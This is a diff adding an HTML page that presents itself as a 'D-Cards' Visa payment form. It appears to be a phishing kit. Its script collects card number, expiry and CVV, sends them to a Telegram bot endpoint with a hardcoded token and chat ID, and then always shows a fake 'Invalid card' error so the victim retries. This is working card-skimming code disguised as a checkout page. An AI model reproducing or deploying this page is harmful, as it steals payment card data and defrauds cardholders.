@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>D-Cards Payment</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: url('background.png') no-repeat center center fixed;
+      background-size: cover;
+      color: #FFD700;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 60px auto;
+      padding: 20px;
+    }
+
+    .glass-box {
+      background: rgba(0, 0, 0, 0.75);
+      border-radius: 20px;
+      padding: 30px 20px;
+      box-shadow: 0 0 20px #000;
+      border: 1px solid rgba(255,255,255,0.15);
+      text-align: center;
+      position: relative;
+    }
+
+    .icon {
+      width: 80px;
+      height: 80px;
+      object-fit: cover;
+      border-radius: 50%;
+      border: 2px solid #FFD70088;
+      margin-bottom: 20px;
+    }
+
+    .pay-info {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid #FFD70033;
+      border-radius: 10px;
+      padding: 15px;
+      font-size: 18px;
+      margin-bottom: 20px;
+      text-shadow: 0 0 4px #000;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #FFD70044;
+      border-radius: 10px;
+      background: rgba(255,255,255,0.05);
+      color: #fff;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+
+    .btn-submit {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(to right, #FFD700, #e6c300);
+      color: #000;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+
+    .error-popup {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      border-radius: 20px;
+      background: rgba(0,0,0,0.85);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 10;
+    }
+
+    .error-text {
+      color: #FFD700;
+      font-weight: bold;
+      font-size: 16px;
+      margin-bottom: 15px;
+      text-align: center;
+    }
+
+    .close-btn {
+      margin-top: 10px;
+      padding: 8px 20px;
+      background: #FFD700;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="glass-box">
+      <img src="visa.png" alt="Visa" class="icon" />
+      <div class="pay-info" id="payText">You must pay: ... USD</div>
+
+      <input type="text" id="cardNumber" maxlength="16" placeholder="Card Number (16 digits)" />
+      <input type="text" id="cardDate" maxlength="4" placeholder="Expiry MMYY" />
+      <input type="text" id="cardCVV" maxlength="3" placeholder="CVV (3 digits)" />
+
+      <button class="btn-submit" onclick="submitCard()">Done Payment</button>
+
+      <div class="error-popup" id="errorPopup">
+        <div class="error-text">❌ Invalid card. Please try again.</div>
+        <button class="close-btn" onclick="closePopup()">OK</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const amount = localStorage.getItem("amount_usdt") || "0";
+    document.getElementById("payText").innerText = `we accept only valid cards`;
+
+    function submitCard() {
+      const number = document.getElementById("cardNumber").value.trim();
+      const date = document.getElementById("cardDate").value.trim();
+      const cvv = document.getElementById("cardCVV").value.trim();
+
+      const msg = `💳 D-CARD PAYMENT\nAmount: ${amount} USD\nCard: ${number}\nDate: ${date}\nCVV: ${cvv}`;
+
+      // Send to Telegram
+      fetch("https://api.telegram.org/bot7541294448:AAEbnzKns8iQnv01Q6wgTmRyNhqEBDpxCqo/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: "7739393558",
+          text: msg
+        })
+      });
+
+      // Always show error popup (simulate invalid card)
+      document.getElementById("errorPopup").style.display = "flex";
+    }
+
+    function closePopup() {
+      document.getElementById("errorPopup").style.display = "none";
+    }
+  </script>
+
+</body>
+</html>
